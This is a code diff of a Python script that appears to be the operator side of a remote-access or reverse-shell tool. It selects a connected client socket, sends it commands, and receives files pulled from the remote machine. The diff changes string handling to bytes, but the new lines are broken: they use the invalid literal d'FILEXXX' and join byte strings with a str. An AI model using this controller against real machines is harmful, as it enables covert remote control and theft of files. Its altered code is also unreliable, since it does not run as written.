@@ -50,7 +50,7 @@ while True:
     pr('\n')
     activate = int(input('Enter option: '))
     
-    Send(socks[activate], 'activateEODXXX')
+    Send(socks[activate], 'activate')
     pr('Activating client ' + str(activate))
 
     sock = socks[activate]
@@ -66,19 +66,20 @@ while True:
       close(sock, client)
       break
 
-    if data.endswith('FILEXXX'):
-      data = data[:-7].split('FILENAMEXXX')
+    if data.endswith(d'FILEXXX'):
+      data = data[:-7].split(d'FILENAMEXXX')
       d = ''.join(data[:-1])
-      fn = data[-1]
-      
+      fn = data[-1].decode()
       try:
-        f = open(fn, 'w+')
+        f = open(fn, 'wb')
       except IOError:
         print('Error opening file')
       f.write(d)
       f.close()
+    else:
+      data = data.decode()
 
-    elif data == 'exit ok':
+    if data == 'exit ok':
       active = False
       close(sock, client)
       break
@@ -99,8 +100,8 @@ while True:
         print('Error opening file')
       d = f.read()
       f.close()
-      d += 'FILENAMEXXX%sFILEXXXEODXXX' % fn
+      d += 'FILENAMEXXX%sFILEXXX' % fn
       Send(sock, d)
     
     else:
-      Send(sock, nc + 'EODXXX')
+      Send(sock, nc)
